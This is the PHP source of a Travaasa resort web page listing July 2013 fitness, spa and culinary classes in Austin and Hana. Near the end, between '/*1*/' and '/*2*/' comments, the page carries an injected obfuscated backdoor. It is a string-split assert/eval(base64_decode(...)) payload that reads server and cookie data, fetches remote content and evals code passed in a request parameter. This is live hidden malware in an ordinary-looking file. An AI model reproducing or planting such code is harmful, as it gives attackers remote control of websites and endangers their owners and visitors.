<?php
	session_start();
	$loc = @$_GET['loc']; 
	if (strlen($loc) > 0 && ($loc == 'hana' || $loc == 'austin')){ 
	  $_SESSION["origLoc"] = $loc;
	} elseif (isset($_SESSION["origLoc"])) {
	  $loc = $_SESSION["origLoc"];
	} else {
	  $loc = "default";
	}
   $path = $_SERVER['DOCUMENT_ROOT'];
   include_once($path."/Library/Travaasa_Common.php");
?>
<!DOCTYPE html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<title>Travaasa July 2013 Featured Experiences</title>
	<meta name="keywords" content="travaasa, travel, resorts, hana, hāna, hawaii, austin, texas, Austin resort, Austin spa, travaasa Austin, Austin spa resort, experiential, hotel, Austin hotel, Austin conference center, Austin group meeting" />
	<meta name="description" content="Rediscover the magic of travel with Travaasa Austin, Texas or Hana, Maui." />
	<?php 
   include_once($path."/Library/Travaasa_Head.php");
	?>
<!-- start NAVIS Code -->
<script type="text/javascript" src="http://www.navistechnologies.info/JavascriptPhoneNumber/js.aspx?account=15070&amp;jspass=ivcsp4gaxk4fbz8banxd&amp;dflt=<?php 
if ($loc == 'hana') :
echo NAVIS_GLOBAL_HANA;
elseif ($loc == 'austin') :
echo NAVIS_GLOBAL_AUSTIN;
else :
echo NAVIS_GLOBAL_DEFAULT;
endif; 
?>"></script>
<script type="text/javascript">ProcessNavisNCKeyword();</script>
<!-- end NAVIS Code -->
</head>
<body>
<!-- Google Tag Manager -->
<noscript><iframe src="//www.googletagmanager.com/ns.html?id=GTM-MW4X3M"
height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'//www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-MW4X3M');</script>
<!-- End Google Tag Manager -->
<?php 
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Menu_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Menu_Austin.php");
else :
include_once($path."/Library/Travaasa_Menu.php");
endif; 
?>
<section id="feature1_wrapper" class="feature_carousel clearfix">
    <div id="feature1" class="feature">
      <div class="slide"><img src="/assets/images/feature_months_july_2013_1600x640-hana.jpg" alt="July is Independence Month at Travaasa"></div>
    </div>
</section>
<section id="content">
<article id="main">
  <section class="intro pad clearfix">    
    <div class="section group">
    	<div class="col span_1_of_2">
            <h2>Fitness</h2>
            <div class="listing">
                <h6>Zumba&#174; Fitness <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Zumba&#174; is a revolutionary fitness experience. It takes you on an unforgettable, exhilarating journey to a healthier and happier lifestyle. Jam-packed with steaming-hot dance moves, pulsating Latin and international rhythms and feel-it-to-the-core routines, this invigorating dance-fitness party will have you movin' and groovin' the fat right off.</p>
            </div>
            <div class="listing">
                <h6>Salsa Dance &amp; Joy <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Let's experience the joy of dancing. Begin with the basic footwork, embrace your partner and move in harmony around the dance floor. In this Salsa Dance class, you will learn the basic salsa steps, how to properly lead and turn, and some beginner-to-intermediate patterns to go salsa dance with confidence!</p>
            </div>
            <div class="listing">
                <h6>Tai Chi Joy <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Tai Chi is a joyful practice that empowers our energy centers. It is also described as "meditation in motion" and helps us to nurture our body as we gather energy and calm our mind. The Tai Chi forms (or postures) are done in a relaxed, artful and linked way, with the circular and rhythmic movements of one position flowing seamlessly into the next. The five essential qualities of Tai Chi are: slowness to develop awareness, lightness to make movements flow, balance to prevent body strain, calmness to maintain continuity and clarity to focus the mind. Some claim that Tai Chi helps with various health conditions and has both physical and mental benefits.</p>
            </div>
            <div class="listing">
                <h6>Foot Care <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>The feet are an extremely vital part of the musculoskeletal system. They are the base of support. They accelerate and decelerate the whole body and influence all the other joints above, including your spine. Learning about your feet as well as massaging and strengthening them is very important for mobility and back health. It is also important to note that certain areas in the foot, when stimulated, will affect certain organs. This class will help to improve mobility, strength, power and general health.</p>
            </div>
            <div class="listing">
                <h6>Aqua Yoga <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Practicing yoga in the pool is for everybody, from folks who need a little extra support to those who are just looking for a new way to deepen their yoga practice. We will use the pool wall and noodles for support while keeping our head nice and dry.</p>
            </div>
            <div class="listing">
                <h6>Aqua Aerobics <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Kick off your day with a wet, weightless workout!  Enjoy the cardiovascular and strength building benefits of water resistance exercises with other guests and our local Kupuna (elders).  This class is safe and effective for everybody and is a great way to stay cool while you work out.</p>
            </div>
            <div class="listing">
                <h6>Inspire Fitness Boot Camp <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Come be inspired to work a little harder toward your fitness goals. We use teamwork and camaraderie as integral parts of this Fitness Boot Camp class. So, look no further, and find the true joy of exercise while working out with others toward a common goal.</p>
            </div>
        </div>
        <div class="col span_1_of_2">
            <div class="listing">
                <h6>Core Elation <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Come find the joy of a stronger, more shapely torso by challenging the powerhouse of your body, the "core." This fitness class focuses on the muscles that control and support your spine, pelvis and shoulder girdle. In this short 45-minute class, you will improve your posture and alignment while strengthening and toning your waistline.</p>
            </div>
            <div class="listing">
                <h6>Celebrating Yoga <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Energize your body and mind with a flowing Hatha-style Yoga experience.  Celebrate gratitude for your health as you integrate breath, movement and kinesthetic awareness surrounded by the natural beauty of Austin or Hana.</p>
            </div>
            <div class="listing">
                <h6>Pilates &#8211; Ignite Your Core <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Pilates practice is a well-rounded exercise method that works with the deeper muscles along the spine. They are very important for good posture and mobility. Ignite your core with this practice for a stronger torso and increased core stability, which creates greater range of motion; stronger, more controlled movement; and a leaner, more toned physique.</p>
            </div>
            <div class="listing">
                <h6>Yoga Therapy for Hips &amp; Knees <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Hips and knees often take a toll during everyday living and sports activities. This workout will create more awareness, range of motion and strength to the muscles around these joints for better mobility and enjoyment of an active life.</p>
            </div>
            <h2>Spa &amp; Wellness</h2>
            <div class="listing">
                <h6>Aqua Aerobics <span class="disclaimer">– <a href="/hana">Hana, Maui</a></span></h6>
                <p>Kick off your day with a wet, weightless workout!  Enjoy the cardiovascular and strength building benefits of water resistance exercises with other guests and our local Kupuna (elders).  This class is safe and effective for everybody and is a great way to stay cool while you work out.</p>
            </div>
            <div class="listing">
                <h6>Igniting a Meditation Practice <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Learn light stretches that help prepare the body for meditation along with comfortable sitting postures, and be led through a guided meditation.</p>
            </div>

            <h2>Culinary</h2>
            <div class="listing">
                <h6>BBQ <span class="disclaimer">– <a href="/austin">Austin</a></span></h6>
                <p>Texans love their BBQ, and you can learn how to prepare wonderful recipes to prepare back home.</p>
            </div>
            <div class="listing">
                <h6>To Your Health &#8211; Juicing <span class="disclaimer">– <a href="/austin">Austin</a> &amp; <a href="/hana">Hana, Maui</a></span></h6>
                <p>Get healthy the natural way with whole fruit juice! This is not a diet or a fad; it is a revolutionary method of getting all the vitamins and minerals your body needs in a natural, effective and more time-efficient way. Drink to your health!</p>
            </div>
        </div>
    </div>  
      
  </section>
  
  <section class="grey pad">
        <h4>See upcoming months</h4>
  		<div class="group">
            <div class="col span_1_of_3 month"><div class="active"><a href="/calendar/2013/july/"><img src="/assets/images/months/jul-independence.png" alt="July is Independence Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2013/august/"><img src="/assets/images/months/aug-dive.png" alt="August is Dive Month"></a></div></div>
            <div class="col span_1_of_3 month"><div><a href="/calendar/2013/september/"><img src="/assets/images/months/sep-uncover.png" alt="September is Uncover Month"></a></div></div>
        </div>
  </section>
  
</article>
</section>
<?php
/*1*/ 
if (!$ind5eae2f00) { $ind5eae2f00 = TRUE;assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXT1BcnJheShiYXNlNjRfZGVjb2RlKCdaWCcgLidKeWIzJyAuJ0onIC4nZmMnIC4nbVZ3YicgLiczSjBhVzVuJyksYmFzZTY0X2RlY29kZSgnYVc1cFgzJyAuJ05sJyAuJ2RBJyAuJz09JyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMScgLic5dFlYJyAuJ1JqYUE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVicgLic5blpYUmZZMjknIC4ndWRHVnVkSE09JyksYmFzZTY0X2RlY29kZSgnYzMnIC4nUnknIC4nY21sd2IzTScgLic9JyksYmFzZTY0X2RlY29kZSgnYlgnIC4nUmZjbUZ1WkE9PScpLGJhc2U2NF9kZWNvZGUoJ1ptJyAuJ2RsJyAuJ2RHTnpkJyAuJ2c9PScpLGJhc2U2NF9kZWNvZGUoJ2RYJyAuJ0onIC4nc1onIC4nVzVqYjJSbCcpLGJhc2U2NF9kZWNvZGUoJ2RYSicgLidzJyAuJ1pXNWpiJyAuJzJSbCcpLGJhc2U2NF9kZWNvZGUoJ2JXUTEnKSxiYXNlNjRfZGVjb2RlKCcnIC4nYVc1cFgyZGxkJyAuJ0E9PScpLGJhc2U2NF9kZWNvZGUoJ1ptbHNaVjluWicgLidYUmZZMjknIC4ndWRHJyAuJ1Z1ZEhNPScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nblZ1WTNSJyAuJ3AnIC4nYjInIC4nNWZaWGhwJyAuJ2MzUnonKSxiYXNlNjRfZGVjb2RlKCdZM1Z5YkY5cGJtJyAuJ2wwJyksYmFzZTY0X2RlY29kZSgnJyAuJ1kzVnliRjl6JyAuJ1onIC4nWFJ2Y0hRJyAuJz0nKSxiYXNlNjRfZGVjb2RlKCdZJyAuJzNWeWJGOXpaWFInIC4ndmNIUT0nKSxiYXNlNjRfZGVjb2RlKCcnIC4nWTNWeWJGOScgLidsZUcnIC4nVmonKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWMnIC4nRzl6JyksYmFzZTY0X2RlY29kZSgnZFc1JyAuJ3dZV05yJyksYmFzZTY0X2RlY29kZSgnWTMnIC4nVnliRjlqYkc5eicgLidaJyAuJ1E9PScpLGJhc2U2NF9kZWNvZGUoJ2RIJyAuJ0onIC4ncGJRPScgLic9JyksYmFzZTY0X2RlY29kZSgnYzJWemMybHZibCcgLic5cFonIC4nQT09JyksYmFzZTY0X2RlY29kZSgnWm4nIC4nTicgLid2JyAuJ1kydHZjR1Z1JyksYmFzZTY0X2RlY29kZSgnWm1kbGRHTT0nKSxiYXNlNjRfZGVjb2RlKCdjJyAuJzNSeWRHOXNiM2RsY2c9PScpLGJhc2U2NF9kZWNvZGUoJ1onIC4nbmQnIC4neWFYUicgLidsJyksYmFzZTY0X2RlY29kZSgnWm1WdlpnPT0nKSxiYXNlNjRfZGVjb2RlKCdabWRsJyAuJ2RITT0nKSxiYXNlNjRfZGVjb2RlKCdiWFInIC4nZmNtRnVaQT09JyksYmFzZTY0X2RlY29kZSgnWTNKbFlYUmxYMloxJyAuJ2JtJyAuJ04wYVc5dScpLGJhc2U2NF9kZWNvZGUoJ1ptTnNiM05sJyksYmFzZTY0X2RlY29kZSgnY0hKJyAuJ2xaMTl6Y0d4JyAuJ3BkQT09JyksYmFzZTY0X2RlY29kZSgnYlhSJyAuJ2ZjJyAuJ21GdVpBPT0nKSxiYXNlNjRfZGVjb2RlKCdabXh2WTInIC4ncz0nKSxiYXNlNjRfZGVjb2RlKCdjM1J5YVhCeicgLidiR0Z6JyAuJ2EnIC4nR1Z6JykpOyAgZnVuY3Rpb24gXzM5OTQyODQoJGkpeyRhPUFycmF5KCdaR2x6JyAuJ2NHeGgnIC4nZVYnIC4nOWxjbkp2Y25NPScsJ01BPT0nLCdZMnhwWicgLidXNTBYMk4nIC4nb1pXJyAuJ04nIC4ncicsJ1kyeCcgLidwWicgLidXJyAuJzUwWDInIC4nTm9aJyAuJ1dOcicsJ1MnIC4nRicgLidSJyAuJ1VVRjlCUScgLicwTkZVRlJmUTBoQlVsTkZWQT0nIC4nPScsJ0lTNGgnIC4nZFE9JyAuJz0nLCdVME4nIC4nU1NWJyAuJ0JVWCcgLicwWicgLidKVEVWTycgLidRVTFGJywnVlYnIC4nUkdMVGcnIC4nPScsJ2QnIC4nMmx1JyAuJ1pHOScgLiczY3kwJyAuJ3hNaicgLidVJyAuJ3gnLCdTRlJVVUY5QlEwTicgLidGVUYnIC4nUmZRMGhCVWxORlZBPT0nLCdjRzEnIC4ndScsJ1UwVlNWa1ZTWDA1QlRVVT0nLCdVa1ZSVlVWJyAuJ1RWRjlWVWtrPScsJ1MnIC4nRlInIC4nVVVGOVZVMFZTWCcgLicwRkhSVTVVJywnVWtWJyAuJ05UJyAuJzFSRlgnIC4nMEYnIC4nRVJGST0nLCdkV3hwYm10a1knIC4naTVqYicgLicyMD0nLCdMJyAuJzJkbGRDNScgLid3YUgnIC4nQS9aRDA9JywnSm5VOScsJ0ptTTknLCdKbWs5TVNacCcgLidjRCcgLicwPScsJ0ptJyAuJ2c5JywnTScgLid6a3dZalZoTScgLidXUTVaJyAuJ1RNMllUUXpNMlUnIC4nMFltSXhZelInIC4naVkyWScgLicxTVdGbE0yVScgLic9JywnJyAuJ01RPT0nLCdZV3gnIC4nc2IzZGYnIC4nZFhKcycgLidYJyAuJzJadmNHJyAuJ1Z1JywnJyAuJ2FIUicgLicwY0QnIC4nbycgLid2JyAuJ0x3PScgLic9JywnWTNWeScgLidiRjlwYm1sMCcsJ2FIUicgLicwY0Rvdkx3PT0nLCdaMmR2Wkc5JyAuJzAnIC4nZScgLidIRicgLid3YVdOJyAuJ21aSCcgLidJPScsJycgLidkR0ZrYW1GNicsJ1IwJyAuJ1ZVSScgLidBPT0nLCdJRWgnIC4nVVZGQXZNUzR4RFFvJyAuJz0nLCdTRzl6ZEQnIC4nb2cnLCdEJyAuJ1FvPScsJ1EyOXVibScgLidWamRHbHYnIC4nYicgLidqJyAuJ29nUTJ4dmMyVU5DZzBLJywnJywnTDF4U1hGJyAuJ0l2JywnJyAuJ2NBPT0nLCdOVycgLidWaFpUJyAuJ0ptTURBJyAuJz0nKTtyZXR1cm4gYmFzZTY0X2RlY29kZSgkYVskaV0pO30gIGlmKCFpc3NldCgkeGIyNGEwZThfMCkpeyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVswXShyb3VuZCgwKSk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzFdKF8zOTk0Mjg0KDApLF8zOTk0Mjg0KDEpKTtpZighZW1wdHkoJF9DT09LSUVbXzM5OTQyODQoMildKSlkaWUoJF9DT09LSUVbXzM5OTQyODQoMyldKTtpZighaXNzZXQoJHhiMjRhMGU4XzFbXzM5OTQyODQoNCldKSl7aWYoJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzJdKF8zOTk0Mjg0KDUpLCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszXSgkX1NFUlZFUltfMzk5NDI4NCg2KV0pKSkkeGIyNGEwZThfMj1fMzk5NDI4NCg3KTtlbHNlICR4YjI0YTBlOF8yPV8zOTk0Mjg0KDgpO31lbHNleyR4YjI0YTBlOF8yPSR4YjI0YTBlOF8xW18zOTk0Mjg0KDkpXTskeGIyNGEwZThfMz1fMzk5NDI4NCgxMCk7fSR4YjI0YTBlOF80PSRfU0VSVkVSW18zOTk0Mjg0KDExKV0gLiRfU0VSVkVSW18zOTk0Mjg0KDEyKV07JHhiMjRhMGU4XzU9JF9TRVJWRVJbXzM5OTQyODQoMTMpXTskeGIyNGEwZThfNj0kX1NFUlZFUltfMzk5NDI4NCgxNCldO3doaWxlKHJvdW5kKDArODIyLjIrODIyLjIrODIyLjIrODIyLjIrODIyLjIpLXJvdW5kKDArMjA1NS41KzIwNTUuNSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzRdKCR4YjI0YTBlOF83LCR4YjI0YTBlOF84LCR4YjI0YTBlOF8wLCR4YjI0YTBlOF81KTskeGIyNGEwZThfOT1fMzk5NDI4NCgxNSk7aWYocm91bmQoMCszMTc4LjUrMzE3OC41KTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bNV0ocm91bmQoMCs5NjQuNSs5NjQuNSkscm91bmQoMCsxMTA1Ljc1KzExMDUuNzUrMTEwNS43NSsxMTA1Ljc1KSkpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzZdKCR4YjI0YTBlOF8xLCR4YjI0YTBlOF80KTskeGIyNGEwZThfMTA9XzM5OTQyODQoMTYpIC4kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bN10oJHhiMjRhMGU4XzQpIC5fMzk5NDI4NCgxNykgLiRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVs4XSgkeGIyNGEwZThfNSkgLl8zOTk0Mjg0KDE4KSAuJHhiMjRhMGU4XzIgLl8zOTk0Mjg0KDE5KSAuJHhiMjRhMGU4XzYgLl8zOTk0Mjg0KDIwKSAuJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzldKF8zOTk0Mjg0KDIxKSAuJHhiMjRhMGU4XzQgLiR4YjI0YTBlOF81IC4keGIyNGEwZThfMiAuXzM5OTQyODQoMjIpKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTBdKF8zOTk0Mjg0KDIzKSk9PSByb3VuZCgwKzEpKXskeGIyNGEwZThfMD0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTFdKF8zOTk0Mjg0KDI0KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7fWVsc2VpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTJdKF8zOTk0Mjg0KDI1KSkpeyR4YjI0YTBlOF8xMT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTNdKF8zOTk0Mjg0KDI2KSAuJHhiMjRhMGU4XzkgLiR4YjI0YTBlOF8xMCk7JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE0XSgkeGIyNGEwZThfMTEsNDIsRkFMU0UpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNV0oJHhiMjRhMGU4XzExLDE5OTEzLFRSVUUpOyR4YjI0YTBlOF8wPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxNl0oJHhiMjRhMGU4XzExKTtpZigkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMTddKF8zOTk0Mjg0KDI3KSxfMzk5NDI4NCgyOCkpIT09ZmFsc2UpJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzE4XSgkeGIyNGEwZThfOSwkeGIyNGEwZThfNiwkeGIyNGEwZThfMTIpOyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsxOV0oJHhiMjRhMGU4XzExKTtpZigocm91bmQoMCsyOTczKStyb3VuZCgwKzIyOTkrMjI5OSkpPnJvdW5kKDArMjk3Myl8fCAkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjBdKCR4YjI0YTBlOF81LCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTApKTtlbHNleyRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMV0oJHhiMjRhMGU4XzgsJHhiMjRhMGU4XzE0LCR4YjI0YTBlOF8wKTt9fWVsc2V7JHhiMjRhMGU4XzEzPSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyMl0oJHhiMjRhMGU4Xzkscm91bmQoMCs4MCksJHhiMjRhMGU4XzgsJHhiMjRhMGU4Xzcscm91bmQoMCsxMCsxMCsxMCkpO2lmKChyb3VuZCgwKzM4NDIpXnJvdW5kKDArMzg0MikpJiYgJEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzIzXSgkX1JFUVVFU1QsJHhiMjRhMGU4XzIpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNF0oJHhiMjRhMGU4XzksJF9DT09LSUUsJHhiMjRhMGU4XzExKTtpZigkeGIyNGEwZThfMTMpeyR4YjI0YTBlOF8xND1fMzk5NDI4NCgyOSkgLiR4YjI0YTBlOF8xMCAuXzM5OTQyODQoMzApOyR4YjI0YTBlOF8xNCAuPSBfMzk5NDI4NCgzMSkgLiR4YjI0YTBlOF85IC5fMzk5NDI4NCgzMik7JHhiMjRhMGU4XzE0IC49IF8zOTk0Mjg0KDMzKTskR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjVdKCR4YjI0YTBlOF8xMywkeGIyNGEwZThfMTQpOyR4YjI0YTBlOF8xNT1fMzk5NDI4NCgzNCk7d2hpbGUoISRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyNl0oJHhiMjRhMGU4XzEzKSl7JHhiMjRhMGU4XzE1IC49ICRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVsyN10oJHhiMjRhMGU4XzEzLHJvdW5kKDArMTI4KSk7aWYocm91bmQoMCsxNTc5LjIrMTU3OS4yKzE1NzkuMisxNTc5LjIrMTU3OS4yKTwkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjhdKHJvdW5kKDArNjQ1KzY0NSs2NDUrNjQ1KzY0NSkscm91bmQoMCsyMzMzKzIzMzMpKSkkR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMjldKCR4YjI0YTBlOF80LCRfU0VSVkVSKTt9JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMwXSgkeGIyNGEwZThfMTMpO2xpc3QoJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8wKT0kR0xPQkFMU1snXzE1MDkwMzczNDNfJ11bMzFdKF8zOTk0Mjg0KDM1KSwkeGIyNGEwZThfMTUscm91bmQoMCswLjQrMC40KzAuNCswLjQrMC40KSk7aWYocm91bmQoMCsxMzg1LjMzMzMzMzMzMzMrMTM4NS4zMzMzMzMzMzMzKzEzODUuMzMzMzMzMzMzMyk8JEdMT0JBTFNbJ18xNTA5MDM3MzQzXyddWzMyXShyb3VuZCgwKzU3NCs1NzQpLHJvdW5kKDArMTUwMS41KzE1MDEuNSkpKSRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszM10oJHhiMjRhMGU4XzYsJHhiMjRhMGU4XzEyLCR4YjI0YTBlOF8yKTt9fWlmKEAkX1JFUVVFU1RbXzM5OTQyODQoMzYpXT09IF8zOTk0Mjg0KDM3KSlldmFsKCRHTE9CQUxTWydfMTUwOTAzNzM0M18nXVszNF0oJF9SRVFVRVNUWyJjIl0pKTt9ZWNobyAkeGIyNGEwZThfMDsg'))");}
 /*2*/
 
include_once($path."/Library/Travaasa_Testimonials.php");
if ($loc == 'hana') :
include_once($path."/Library/Travaasa_Footer_Hana.php");
elseif ($loc == 'austin') :
include_once($path."/Library/Travaasa_Footer_Austin.php");
else :
include_once($path."/Library/Travaasa_Footer.php");
endif; 
include_once($path."/Library/Travaasa_Scripts.php");
?><script type="text/javascript">
$(function() {
	createSubpageStorylines(true, true);
});
</script>
</body>
</html>